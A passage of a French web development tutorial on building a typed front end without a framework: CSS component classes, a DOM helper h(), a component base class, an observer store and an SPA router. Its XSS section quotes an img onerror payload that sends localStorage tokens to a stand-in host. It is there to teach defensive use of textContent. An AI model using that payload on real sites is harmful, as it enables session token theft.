+<p>Un bouton répété 50 fois avec <code>class="px-4 py-2 rounded bg-primary text-white font-bold…"</code>, c'est illisible et difficile à modifier. Pour les éléments très répétés, on crée une <strong>classe de composant</strong> dans la couche <code>components</code>. Elle reste construite avec les tokens.</p>
+<div class="code"><div class="code-head"><span class="code-title">public/css/components.css</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">@layer components {
+  .btn {
+    display: inline-flex; align-items: center; gap: var(--space-2);
+    padding: var(--space-2) var(--space-4);
+    border: 1px solid transparent;
+    border-radius: var(--radius-md);
+    font: inherit; font-weight: 600;
+    cursor: pointer;
+    transition: background var(--transition);
+  }
+  .btn:focus-visible { outline: 3px solid var(--color-primary); outline-offset: 2px; }
+  .btn:disabled      { opacity: .5; cursor: not-allowed; }
+
+  .btn-primary       { background: var(--color-primary); color: white; }
+  .btn-primary:hover { background: var(--color-primary-hover); }
+  .btn-ghost         { background: transparent; border-color: var(--color-border); color: var(--color-text); }
+
+  .card {
+    background: var(--color-surface);
+    border: 1px solid var(--color-border);
+    border-radius: var(--radius-md);
+    box-shadow: var(--shadow-sm);
+  }
+
+  .badge {
+    display: inline-block;
+    padding: var(--space-1) var(--space-2);
+    border-radius: var(--radius-full);
+    font-size: var(--text-xs); font-weight: 600;
+    background: hsl(from var(--badge-color, var(--color-text-muted)) h s l / 0.15);
+    color: var(--badge-color, var(--color-text-muted));
+  }
+  .badge-success { --badge-color: var(--color-success); }
+  .badge-danger  { --badge-color: var(--color-danger); }
+  .badge-warning { --badge-color: var(--color-warning); }
+}</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 L'astuce du badge</div><p>Le badge ne définit qu'une seule variable locale <code>--badge-color</code>. Le fond est calculé à partir d'elle avec la syntaxe de couleur relative <code>hsl(from …)</code> (même teinte, 15 % d'opacité). Ajouter une variante = une ligne. C'est le même principe que les modificateurs BEM, en plus court.</p></div>
+
+<h2>Essaie : combine les classes</h2>
+<p>Coche les classes et regarde la carte changer. Toutes ces classes existent dans le CSS de cette page.</p>
+<div class="playground">
+  <div class="pg-controls" id="pg-controls"></div>
+  <div class="pg-stage"><div id="pg-card" class="pgc">
+    <span class="pg-badge">En attente</span>
+    <strong>Projet : Intranet v1</strong>
+    <span class="pg-muted">Échéance : 14 décembre</span>
+  </div></div>
+  <code class="pg-output" id="pg-output"></code>
+</div>
+
+<div class="callout info"><div class="callout-title">🔗 Ne génère que ce qui sert</div><p>Tailwind produit seulement les classes que tu utilises grâce à son CLI. Toi, tu n'as pas de CLI : n'écris donc pas les 400 combinaisons possibles. Commence par les classes dont tes maquettes ont besoin, et ajoutes-en au fur et à mesure. Un fichier de 300 lignes bien rangé vaut mieux qu'un fichier de 3 000 lignes jamais lu.</p></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Crée une page <code>styleguide.html</code> qui affiche toutes tes classes : nuancier de couleurs, échelle typographique, boutons dans tous leurs états (hover, focus, disabled), badges des statuts de rendu (en attente, en retard, corrigé). Elle te servira de documentation et de démonstration pendant la revue d'architecture.</p></div>
+</section>
+<section role="tabpanel" id="dom" aria-labelledby="tab-dom" hidden>
+<p class="kicker">Étape 4</p>
+<h1>Manipuler le DOM avec TypeScript</h1>
+<p class="lead">Sans JSX, il faut une façon courte et typée de créer des éléments. On écrit deux petites fonctions qui seront la base de tout le reste.</p>
+
+<h2>Le problème de <code>querySelector</code></h2>
+<div class="code"><div class="code-head"><span class="code-title">Ce que TypeScript te reproche</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">const btn = document.querySelector(&#x27;#save&#x27;);
+btn.disabled = true;
+// ❌ &#x27;btn&#x27; is possibly &#x27;null&#x27;
+// ❌ Property &#x27;disabled&#x27; does not exist on type &#x27;Element&#x27;</code></pre></div>
+<p>Deux problèmes : l'élément peut ne pas exister (<code>null</code>), et TypeScript ne sait pas que c'est un bouton. La solution : un générique et une vérification.</p>
+<div class="code"><div class="code-head"><span class="code-title">Version typée</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">const btn = document.querySelector&lt;HTMLButtonElement&gt;(&#x27;#save&#x27;);
+if (btn) btn.disabled = true;      // ✅ vérification explicite
+
+// Raccourci : une fonction qui lève une erreur si l&#x27;élément manque
+const btn2 = $&lt;HTMLButtonElement&gt;(&#x27;#save&#x27;);
+btn2.disabled = true;               // ✅ jamais null</code></pre></div>
+
+<h2>La fonction <code>h()</code> : ton JSX maison</h2>
+<p>C'est l'équivalent de <code>React.createElement</code>, la fonction en laquelle JSX est compilé. Grâce à <code>HTMLElementTagNameMap</code>, TypeScript sait que <code>h('input')</code> renvoie un <code>HTMLInputElement</code> et te propose les bonnes propriétés (<code>value</code>, <code>type</code>…).</p>
+<div class="code"><div class="code-head"><span class="code-title">src/core/dom.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">type Child = Node | string | number | false | null | undefined;
+
+type Props&lt;K extends keyof HTMLElementTagNameMap&gt; =
+  Partial&lt;Omit&lt;HTMLElementTagNameMap[K], &#x27;style&#x27; | &#x27;dataset&#x27;&gt;&gt; &amp; {
+    class?: string;
+    dataset?: Record&lt;string, string&gt;;
+  };
+
+export function h&lt;K extends keyof HTMLElementTagNameMap&gt;(
+  tag: K,
+  props: Props&lt;K&gt; = {},
+  ...children: Child[]
+): HTMLElementTagNameMap[K] {
+  const el = document.createElement(tag);
+  const { class: className, dataset, ...rest } = props;
+
+  if (className) el.className = className;
+  if (dataset) Object.assign(el.dataset, dataset);
+  Object.assign(el, rest);
+
+  for (const child of children) {
+    if (child === false || child === null || child === undefined) continue;
+    el.append(child instanceof Node ? child : String(child));
+  }
+  return el;
+}
+
+export function $&lt;T extends Element = HTMLElement&gt;(selector: string, root: ParentNode = document): T {
+  const el = root.querySelector&lt;T&gt;(selector);
+  if (!el) throw new Error(`Élément introuvable : ${selector}`);
+  return el;
+}</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Utilisation : comparer avec le JSX équivalent</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">const card = h(&#x27;article&#x27;, { class: &#x27;card p-4 stack-2&#x27; },
+  h(&#x27;h3&#x27;, { class: &#x27;text-lg&#x27; }, project.title),
+  h(&#x27;p&#x27;, { class: &#x27;text-muted&#x27; }, `Échéance : ${project.dueDate}`),
+  project.isLate &amp;&amp; h(&#x27;span&#x27;, { class: &#x27;badge badge-danger&#x27; }, &#x27;En retard&#x27;),
+  h(&#x27;a&#x27;, { href: `/projets/${project.id}`, dataset: { link: &#x27;&#x27; } }, &#x27;Voir&#x27;),
+);</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Le même en React</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-tsx">&lt;article className=&quot;card p-4 stack-2&quot;&gt;
+  &lt;h3 className=&quot;text-lg&quot;&gt;{project.title}&lt;/h3&gt;
+  &lt;p className=&quot;text-muted&quot;&gt;Échéance : {project.dueDate}&lt;/p&gt;
+  {project.isLate &amp;&amp; &lt;span className=&quot;badge badge-danger&quot;&gt;En retard&lt;/span&gt;}
+  &lt;a href={`/projets/${project.id}`}&gt;Voir&lt;/a&gt;
+&lt;/article&gt;</code></pre></div>
+<p>Note que <code>false</code>, <code>null</code> et <code>undefined</code> sont ignorés dans les enfants : c'est ce qui permet <code>condition &amp;&amp; h(...)</code>, comme en React.</p>
+
+<h2>Sécurité : <code>textContent</code>, jamais <code>innerHTML</code> avec des données</h2>
+<p>Le sujet demande une « partie frontale sécurisée ». La faille n°1 côté front est le <strong>XSS</strong> : afficher du texte venant d'un utilisateur comme du HTML.</p>
+<div class="code"><div class="code-head"><span class="code-title">XSS</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">// Un étudiant écrit ce commentaire dans son rendu :
+const comment = &#x27;&lt;img src=x onerror=&quot;fetch(`https://pirate.io?t=${localStorage.token}`)&quot;&gt;&#x27;;
+
+// ❌ Le navigateur crée l&#x27;image, l&#x27;erreur se déclenche, le script s&#x27;exécute
+div.innerHTML = `&lt;p&gt;${comment}&lt;/p&gt;`;
+
+// ✅ Le texte est affiché tel quel, rien n&#x27;est interprété
+p.textContent = comment;
+
+// ✅ h() utilise append(string), qui crée un nœud texte : sûr aussi
+h(&#x27;p&#x27;, {}, comment);</code></pre></div>
+<div class="callout danger"><div class="callout-title">⛔ La règle</div><p><code>innerHTML</code> uniquement avec du HTML que <strong>tu</strong> as écrit en dur. Dès qu'une donnée vient de l'API, d'une URL ou d'un formulaire : <code>textContent</code>, <code>append()</code> ou <code>h()</code>. React fait cette protection automatiquement ; ici, c'est à toi d'y penser.</p></div>
+
+<h2>Les événements et la délégation</h2>
+<p>Au lieu de mettre un écouteur sur chacun des 50 boutons d'une liste, on en met <strong>un seul</strong> sur le parent, et on regarde quel élément a été cliqué. Avantage : ça marche aussi pour les éléments ajoutés plus tard.</p>
+<div class="code"><div class="code-head"><span class="code-title">Délégation d&#x27;événements</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">list.addEventListener(&#x27;click&#x27;, (e) =&gt; {
+  // closest() remonte du clic jusqu&#x27;au bouton (même si on clique sur une icône dedans)
+  const btn = (e.target as Element).closest&lt;HTMLButtonElement&gt;(&#x27;button[data-action]&#x27;);
+  if (!btn) return;
+
+  const id = Number(btn.dataset.id);
+  switch (btn.dataset.action) {
+    case &#x27;delete&#x27;: deleteProject(id); break;
+    case &#x27;edit&#x27;:   openEditor(id);    break;
+  }
+});</code></pre></div>
+<p>Les attributs <code>data-*</code> sont accessibles via <code>element.dataset</code> : <code>data-action="edit"</code> devient <code>btn.dataset.action</code>. Ce sont toujours des chaînes, d'où le <code>Number()</code>.</p>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Écris ton propre <code>dom.ts</code>. Puis affiche une liste de 3 projets factices (un tableau en dur) avec <code>h()</code>, et un seul écouteur sur la liste qui affiche dans la console l'id du projet cliqué.</p></div>
+</section>
+<section role="tabpanel" id="components" aria-labelledby="tab-components" hidden>
+<p class="kicker">Étape 5</p>
+<h1>Des composants réutilisables</h1>
+<p class="lead">Le sujet vise la compétence « développer des interfaces utilisateur réutilisables de type composant ». On crée une classe de base dont tous les composants héritent : elle gère le montage, le re-render et le nettoyage.</p>
+
+<h2>Le cycle de vie</h2>
+<table>
+<thead><tr><th>Méthode</th><th>Rôle</th><th>Équivalent React</th></tr></thead>
+<tbody>
+<tr><td><code>render()</code></td><td>Construit et renvoie l'élément</td><td>Le corps de la fonction composant</td></tr>
+<tr><td><code>mount(container)</code></td><td>Insère dans la page</td><td><code>createRoot().render()</code></td></tr>
+<tr><td><code>onMount()</code></td><td>Ajoute les écouteurs, lance un fetch</td><td><code>useEffect(() =&gt; …, [])</code></td></tr>
+<tr><td><code>update()</code></td><td>Reconstruit et remplace</td><td>Re-render après <code>setState</code></td></tr>
+<tr><td><code>unmount()</code></td><td>Retire et nettoie</td><td>Fonction de retour de <code>useEffect</code></td></tr>
+</tbody>
+</table>
+<div class="code"><div class="code-head"><span class="code-title">src/core/component.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">export abstract class Component&lt;P extends object = object&gt; {
+  protected root: HTMLElement | null = null;
+  private abort = new AbortController();
+
+  constructor(protected props: P) {}
+
+  protected abstract render(): HTMLElement;
+
+  protected onMount(): void {}
+
+  protected get signal(): AbortSignal {
+    return this.abort.signal;
+  }
+
+  mount(container: HTMLElement): void {
+    this.root = this.render();
+    container.replaceChildren(this.root);
+    this.onMount();
+  }
+
+  update(): void {
+    if (!this.root) return;
+    this.abort.abort();
+    this.abort = new AbortController();
+    const next = this.render();
+    this.root.replaceWith(next);
+    this.root = next;
+    this.onMount();
+  }
+
+  unmount(): void {
+    this.abort.abort();
+    this.root?.remove();
+    this.root = null;
+  }
+}</code></pre></div>
+
+<h3>Pourquoi un <code>AbortController</code> ?</h3>
+<p>Si on reconstruit un composant sans retirer ses anciens écouteurs, ils restent en mémoire et se déclenchent en double : c'est une fuite mémoire. Passer <code>{ signal }</code> à <code>addEventListener</code> permet de tous les supprimer d'un coup avec <code>abort()</code>. Le même signal peut être passé à <code>fetch()</code> pour annuler une requête quand on quitte la page.</p>
+<div class="code"><div class="code-head"><span class="code-title">Utilisation du signal</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">protected onMount(): void {
+  // retiré automatiquement à chaque update() et unmount()
+  window.addEventListener(&#x27;resize&#x27;, this.onResize, { signal: this.signal });
+
+  // annulé si le composant disparaît avant la réponse
+  fetch(&#x27;/api/projects&#x27;, { signal: this.signal });
+}</code></pre></div>
+
+<h2>Un composant concret</h2>
+<div class="code"><div class="code-head"><span class="code-title">src/components/StatusBadge.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { Component } from &#x27;../core/component.js&#x27;;
+import { h } from &#x27;../core/dom.js&#x27;;
+
+type Status = &#x27;pending&#x27; | &#x27;late&#x27; | &#x27;graded&#x27;;
+
+interface StatusBadgeProps { status: Status }
+
+const LABELS: Record&lt;Status, { text: string; variant: string }&gt; = {
+  pending: { text: &#x27;En attente&#x27;, variant: &#x27;badge-warning&#x27; },
+  late:    { text: &#x27;En retard&#x27;,  variant: &#x27;badge-danger&#x27; },
+  graded:  { text: &#x27;Corrigé&#x27;,    variant: &#x27;badge-success&#x27; },
+};
+
+export class StatusBadge extends Component&lt;StatusBadgeProps&gt; {
+  protected render(): HTMLElement {
+    const { text, variant } = LABELS[this.props.status];
+    return h(&#x27;span&#x27;, { class: `badge ${variant}` }, text);
+  }
+}</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 Record&lt;Status, …&gt;</div><p>Si tu ajoutes un statut <code>'draft'</code> au type <code>Status</code>, TypeScript signale une erreur dans <code>LABELS</code> tant que tu n'as pas ajouté son libellé. Impossible d'oublier un cas.</p></div>
+
+<h2>Composer des composants</h2>
+<p>Un composant parent crée ses enfants et les monte dans un conteneur. Pour les petits composants sans état (un badge), une simple <strong>fonction</strong> qui renvoie un élément suffit souvent : pas besoin de classe.</p>
+<div class="code"><div class="code-head"><span class="code-title">Composition</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">// Composant « fonction » : pas d&#x27;état, pas d&#x27;écouteurs
+const statusBadge = (status: Status) =&gt;
+  h(&#x27;span&#x27;, { class: `badge ${LABELS[status].variant}` }, LABELS[status].text);
+
+export class ProjectCard extends Component&lt;{ project: Project }&gt; {
+  protected render(): HTMLElement {
+    const { project } = this.props;
+    return h(&#x27;article&#x27;, { class: &#x27;card p-4 stack-2&#x27; },
+      h(&#x27;header&#x27;, { class: &#x27;flex justify-between items-center&#x27; },
+        h(&#x27;h3&#x27;, {}, project.title),
+        statusBadge(project.status),
+      ),
+      h(&#x27;p&#x27;, { class: &#x27;text-muted text-sm&#x27; }, project.brief),
+    );
+  }
+}
+
+// Une liste de composants
+const grid = h(&#x27;div&#x27;, { class: &#x27;grid gap-4 md:grid-cols-2&#x27; });
+projects.forEach((p) =&gt; {
+  const slot = h(&#x27;div&#x27;);
+  grid.append(slot);
+  new ProjectCard({ project: p }).mount(slot);
+});</code></pre></div>
+
+<h2>Et les Web Components ?</h2>
+<p>Le navigateur a son propre système de composants : <code>customElements.define('status-badge', …)</code>. C'est une option valable, mais avec un piège pour ton projet :</p>
+<table>
+<thead><tr><th></th><th>Classe <code>Component</code> maison</th><th>Web Components</th></tr></thead>
+<tbody>
+<tr><td>Utilisation</td><td><code>new StatusBadge({…}).mount(el)</code></td><td><code>&lt;status-badge status="late"&gt;</code> directement dans le HTML</td></tr>
+<tr><td>Props typées</td><td>✅ Oui, via le générique</td><td>Attributs = chaînes, à convertir</td></tr>
+<tr><td>Classes utilitaires</td><td>✅ Fonctionnent</td><td>❌ Bloquées par le Shadow DOM (sauf si tu ne l'utilises pas)</td></tr>
+<tr><td>Standard</td><td>Ton code</td><td>✅ API du navigateur</td></tr>
+</tbody>
+</table>
+<div class="callout warn"><div class="callout-title">⚠️ Shadow DOM et mini-Tailwind ne font pas bon ménage</div><p>Le Shadow DOM isole le CSS : tes classes <code>.p-4</code> ou <code>.btn</code> ne s'appliqueront pas à l'intérieur. Si tu choisis les Web Components, n'attache pas de <code>shadowRoot</code> et écris le contenu directement dans <code>this</code> (light DOM).</p></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Code ton <code>Component</code>, puis trois composants pour le dashboard étudiant : <code>StatusBadge</code>, <code>ProjectCard</code> et un widget <code>UpcomingDeadlines</code> qui affiche une liste de <code>ProjectCard</code>. Ajoute un bouton qui appelle <code>update()</code> et vérifie dans DevTools (onglet Elements) que l'ancien élément est bien remplacé.</p></div>
+</section>
+<section role="tabpanel" id="store" aria-labelledby="tab-store" hidden>
+<p class="kicker">Étape 6</p>
+<h1>Un état partagé et réactif</h1>
+<p class="lead">L'utilisateur connecté, la liste des projets ou le thème sont utilisés par plusieurs composants. On les place dans un <strong>store</strong> : quand il change, il prévient tous ceux qui se sont abonnés.</p>
+
+<h2>Le pattern Observer</h2>
+<p>Le store garde une liste de fonctions (les <em>listeners</em>). À chaque <code>set()</code>, il les appelle toutes. C'est le même principe que les événements du DOM ou l'EventDispatcher de Symfony.</p>
+<div class="code"><div class="code-head"><span class="code-title">src/core/store.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">type Listener&lt;S&gt; = (state: S, prev: S) =&gt; void;
+
+export class Store&lt;S extends object&gt; {
+  private listeners = new Set&lt;Listener&lt;S&gt;&gt;();
+
+  constructor(private state: S) {}
+
+  get(): Readonly&lt;S&gt; {
+    return this.state;
+  }
+
+  set(patch: Partial&lt;S&gt; | ((s: S) =&gt; Partial&lt;S&gt;)): void {
+    const prev = this.state;
+    const changes = typeof patch === &#x27;function&#x27; ? patch(prev) : patch;
+    this.state = { ...prev, ...changes };
+    this.listeners.forEach((fn) =&gt; fn(this.state, prev));
+  }
+
+  subscribe(fn: Listener&lt;S&gt;): () =&gt; void {
+    this.listeners.add(fn);
+    return () =&gt; this.listeners.delete(fn);
+  }
+}</code></pre></div>
+<ul>
+<li><code>set()</code> crée un <strong>nouvel objet</strong> au lieu de modifier l'ancien (immutabilité, comme <code>setState</code> en React). Les listeners peuvent ainsi comparer <code>state</code> et <code>prev</code>.</li>
+<li><code>subscribe()</code> renvoie une fonction de désabonnement, comme le nettoyage de <code>useEffect</code>.</li>
+<li><code>Set</code> plutôt qu'un tableau : on ne peut pas abonner deux fois la même fonction.</li>
+</ul>
+
+<h2>Brancher un composant sur le store</h2>
+<div class="code"><div class="code-head"><span class="code-title">Exemple complet : un compteur</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { Component } from &#x27;../core/component.js&#x27;;
+import { h } from &#x27;../core/dom.js&#x27;;
+import { Store } from &#x27;../core/store.js&#x27;;
+
+interface CounterState { count: number }
+export const counterStore = new Store&lt;CounterState&gt;({ count: 0 });
+
+export class Counter extends Component&lt;{ label: string }&gt; {
+  protected render(): HTMLElement {
+    const { count } = counterStore.get();
+    return h(&#x27;section&#x27;, { class: &#x27;card p-4 stack-2&#x27; },
+      h(&#x27;h2&#x27;, { class: &#x27;text-lg&#x27; }, this.props.label),
+      h(&#x27;p&#x27;, { class: &#x27;text-muted&#x27; }, `Valeur : ${count}`),
+      h(&#x27;button&#x27;, { class: &#x27;btn btn-primary&#x27;, type: &#x27;button&#x27;, dataset: { action: &#x27;inc&#x27; } }, &#x27;+1&#x27;),
+    );
+  }
+
+  protected onMount(): void {
+    this.root?.addEventListener(&#x27;click&#x27;, (e) =&gt; {
+      const btn = (e.target as Element).closest&lt;HTMLElement&gt;(&#x27;[data-action]&#x27;);
+      if (btn?.dataset.action === &#x27;inc&#x27;) {
+        counterStore.set((s) =&gt; ({ count: s.count + 1 }));
+      }
+    }, { signal: this.signal });
+  }
+}
+
+const counter = new Counter({ label: &#x27;Compteur&#x27; });
+counter.mount(document.getElementById(&#x27;app&#x27;)!);
+counterStore.subscribe(() =&gt; counter.update());</code></pre></div>
+
+<h2>Essaie : le store en direct</h2>
+<p>Ci-dessous, le même code tourne dans cette page (version JavaScript). Deux composants différents sont abonnés au même store : clique dans l'un, l'autre se met à jour.</p>
+<div class="demo">
+  <div class="demo-grid">
+    <div id="demo-a"></div>
+    <div id="demo-b"></div>
+  </div>
+  <pre class="demo-log" id="demo-log" aria-live="polite"></pre>
+</div>
+
+<h2>Ne re-render que si c'est utile</h2>
+<p>Avec un seul gros store, chaque changement re-render tout le monde. On ajoute un <strong>sélecteur</strong> : le composant ne se met à jour que si la partie qui l'intéresse a changé.</p>
+<div class="code"><div class="code-head"><span class="code-title">Sélecteur</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">function select&lt;S extends object, T&gt;(
+  store: Store&lt;S&gt;,
+  selector: (s: S) =&gt; T,
+  onChange: (value: T) =&gt; void,
+): () =&gt; void {
+  return store.subscribe((state, prev) =&gt; {
+    const next = selector(state);
+    if (next !== selector(prev)) onChange(next);
+  });
+}
+
+// Le header ne se re-render que quand l&#x27;utilisateur change
+select(appStore, (s) =&gt; s.user, () =&gt; header.update());</code></pre></div>
+
+<h2>Un store par domaine</h2>
+<table>
+<thead><tr><th>Store</th><th>Contenu</th><th>Persistance</th></tr></thead>
+<tbody>
+<tr><td><code>sessionStore</code></td><td>Utilisateur connecté, rôle</td><td>Rechargé via <code>GET /api/me</code> au démarrage</td></tr>
+<tr><td><code>uiStore</code></td><td>Thème, menu ouvert, notifications</td><td>Thème dans <code>localStorage</code></td></tr>
+<tr><td>Données métier</td><td>Projets, rendus…</td><td>Aucune : rechargées depuis l'API (la vérité est en base)</td></tr>
+</tbody>
+</table>
+<div class="code"><div class="code-head"><span class="code-title">src/stores/ui.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">interface UiState { theme: &#x27;light&#x27; | &#x27;dark&#x27; }
+
+function loadTheme(): UiState[&#x27;theme&#x27;] {
+  try {
+    return localStorage.getItem(&#x27;theme&#x27;) === &#x27;dark&#x27; ? &#x27;dark&#x27; : &#x27;light&#x27;;
+  } catch {
+    return &#x27;light&#x27;;   // navigation privée, stockage désactivé…
+  }
+}
+
+export const uiStore = new Store&lt;UiState&gt;({ theme: loadTheme() });
+
+uiStore.subscribe(({ theme }) =&gt; {
+  document.documentElement.dataset.theme = theme;
+  try { localStorage.setItem(&#x27;theme&#x27;, theme); } catch { /* ignore */ }
+});</code></pre></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Crée <code>uiStore</code> avec le thème et un bouton dans le header pour le basculer. Recharge la page : le thème choisi doit être conservé. Puis crée <code>sessionStore</code> avec un utilisateur factice <code>{ name, role }</code> et affiche son nom dans le header.</p></div>
+</section>
+<section role="tabpanel" id="router" aria-labelledby="tab-router" hidden>
+<p class="kicker">Étape 7</p>
+<h1>Un routeur pour une application à page unique</h1>
+<p class="lead">Changer de page sans recharger le navigateur : on intercepte les clics sur les liens, on modifie l'URL avec l'History API, et on affiche la vue correspondante dans le <code>&lt;main&gt;</code>.</p>
+
+<h2>Les trois briques de l'History API</h2>
+<table>
+<thead><tr><th>API</th><th>Rôle</th></tr></thead>
+<tbody>
+<tr><td><code>history.pushState({}, '', '/projets/3')</code></td><td>Change l'URL <strong>sans</strong> requête serveur</td></tr>
+<tr><td><code>location.pathname</code></td><td>Lit le chemin actuel</td></tr>
+<tr><td>Événement <code>popstate</code></td><td>Déclenché par les boutons précédent / suivant du navigateur</td></tr>
+</tbody>
+</table>
+
+<h2>Le routeur complet</h2>
+<div class="code"><div class="code-head"><span class="code-title">src/core/router.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">export type Params = Record&lt;string, string&gt;;
+export type Role = &#x27;student&#x27; | &#x27;trainer&#x27; | &#x27;admin&#x27;;
+
+export interface Route {
+  path: string;
+  view: (params: Params) =&gt; HTMLElement;
+  roles?: Role[];
+}
+
+interface CompiledRoute extends Route {
+  regex: RegExp;
+  keys: string[];
+}
+
+function compile(route: Route): CompiledRoute {
+  const keys: string[] = [];
+  const pattern = route.path.replace(/:(\w+)/g, (_, key: string) =&gt; {
+    keys.push(key);
+    return &#x27;([^/]+)&#x27;;
+  });
+  return { ...route, keys, regex: new RegExp(`^${pattern}/?$`) };
+}
+
+export class Router {
+  private routes: CompiledRoute[];
+
+  constructor(
+    routes: Route[],
+    private outlet: HTMLElement,
+    private getRole: () =&gt; Role | null,
+  ) {
+    this.routes = routes.map(compile);
+
+    document.addEventListener(&#x27;click&#x27;, (e) =&gt; {
+      const link = (e.target as Element).closest&lt;HTMLAnchorElement&gt;(&#x27;a[data-link]&#x27;);
+      if (!link || e.ctrlKey || e.metaKey) return;
+      e.preventDefault();
+      this.navigate(link.pathname);
+    });
+
+    window.addEventListener(&#x27;popstate&#x27;, () =&gt; this.resolve());
+  }
+
+  navigate(path: string): void {
+    if (path === location.pathname) return;
+    history.pushState({}, &#x27;&#x27;, path);
+    this.resolve();
+  }
+
+  resolve(): void {
+    const path = location.pathname;
+
+    for (const route of this.routes) {
+      const match = path.match(route.regex);
+      if (!match) continue;
+
+      if (route.roles) {
+        const role = this.getRole();
+        if (!role) return this.navigate(&#x27;/login&#x27;);
+        if (!route.roles.includes(role)) return this.show(this.forbidden());
+      }
+
+      const params: Params = {};
+      route.keys.forEach((key, i) =&gt; {
+        params[key] = decodeURIComponent(match[i + 1] ?? &#x27;&#x27;);
+      });
+      return this.show(route.view(params));
+    }
+    this.show(this.notFound());
+  }
+
+  private show(view: HTMLElement): void {
+    this.outlet.replaceChildren(view);
+    view.querySelector&lt;HTMLElement&gt;(&#x27;h1&#x27;)?.focus();
+  }
+
+  private notFound(): HTMLElement {
+    const el = document.createElement(&#x27;h1&#x27;);
+    el.textContent = &#x27;Page introuvable&#x27;;
+    return el;
+  }
+
+  private forbidden(): HTMLElement {
+    const el = document.createElement(&#x27;h1&#x27;);
+    el.textContent = &#x27;Accès refusé&#x27;;
+    return el;
+  }
+}</code></pre></div>
+<h3>Comment fonctionnent les paramètres</h3>
+<p><code>compile()</code> transforme <code>/projets/:id</code> en expression régulière <code>^/projets/([^/]+)/?$</code> et retient le nom <code>id</code>. Quand l'URL <code>/projets/42</code> correspond, le groupe capturé <code>42</code> est associé à la clé : <code>params = { id: '42' }</code>. C'est ce que fait <code>useParams()</code> en React Router, ou <code>{id}</code> dans une route Symfony.</p>
+
+<div class="code"><div class="code-head"><span class="code-title">src/main.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { Router } from &#x27;./core/router.js&#x27;;
+import { $ } from &#x27;./core/dom.js&#x27;;
+import { sessionStore } from &#x27;./stores/session.js&#x27;;
+import { loginPage, dashboardPage, projectPage, evaluationPage, adminPage } from &#x27;./pages/index.js&#x27;;
+
+const router = new Router(
+  [
+    { path: &#x27;/login&#x27;,                view: loginPage },
+    { path: &#x27;/&#x27;,                     view: dashboardPage,  roles: [&#x27;student&#x27;, &#x27;trainer&#x27;, &#x27;admin&#x27;] },
+    { path: &#x27;/projets/:id&#x27;,          view: projectPage,    roles: [&#x27;student&#x27;, &#x27;trainer&#x27;] },
+    { path: &#x27;/evaluations/:id&#x27;,      view: evaluationPage, roles: [&#x27;trainer&#x27;] },
+    { path: &#x27;/admin/promotions&#x27;,     view: adminPage,      roles: [&#x27;admin&#x27;] },
+  ],
+  $(&#x27;#app&#x27;),
+  () =&gt; sessionStore.get().user?.role ?? null,
+);
+
+router.resolve();   // affiche la page correspondant à l&#x27;URL de départ</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Les liens</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-html">&lt;a href=&quot;/projets/3&quot; data-link&gt;Voir le projet&lt;/a&gt;   &lt;!-- intercepté par le routeur --&gt;
+&lt;a href=&quot;https://github.com/...&quot;&gt;GitHub&lt;/a&gt;          &lt;!-- lien normal --&gt;</code></pre></div>
+
+<div class="callout danger"><div class="callout-title">⛔ La garde de route n'est PAS une sécurité</div><p>Le <code>roles: ['trainer']</code> évite d'afficher une page inutile, c'est du confort. Mais n'importe qui peut modifier le JavaScript dans DevTools. La vraie protection est sur le <strong>serveur</strong> : chaque route API vérifie le token et le rôle, et renvoie <code>401</code> ou <code>403</code>. Un étudiant qui appelle <code>GET /api/evaluations/12</code> d'un autre étudiant doit recevoir un 403 (c'est la faille IDOR citée dans le sujet).</p></div>
+
+<h2>Accessibilité : gérer le focus</h2>
+<p>Quand une page se recharge, le lecteur d'écran annonce le nouveau titre. Dans une SPA, rien ne se passe : l'utilisateur aveugle ne sait pas que la page a changé. C'est pour ça que <code>show()</code> place le focus sur le <code>&lt;h1&gt;</code> de la nouvelle vue. Pense à mettre <code>tabindex="-1"</code> sur ce <code>h1</code> pour qu'il puisse recevoir le focus, et à mettre à jour <code>document.title</code>.</p>
+
+<h2>Le serveur doit renvoyer <code>index.html</code></h2>
+<p>Si l'utilisateur recharge sur <code>/projets/3</code>, le navigateur demande ce fichier au serveur, qui n'existe pas. Le serveur doit renvoyer <code>index.html</code> pour toute URL inconnue (hors <code>/api</code>), et le routeur prendra le relais.</p>
+<div class="code"><div class="code-head"><span class="code-title">Option A : serveur node:http (extrait)</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { createServer } from &#x27;node:http&#x27;;
+import { readFile } from &#x27;node:fs/promises&#x27;;
+import { extname, join, normalize } from &#x27;node:path&#x27;;
+
+const PUBLIC_DIR = join(import.meta.dirname, &#x27;..&#x27;, &#x27;public&#x27;);
+const MIME: Record&lt;string, string&gt; = {
+  &#x27;.html&#x27;: &#x27;text/html; charset=utf-8&#x27;,
+  &#x27;.js&#x27;: &#x27;text/javascript; charset=utf-8&#x27;,
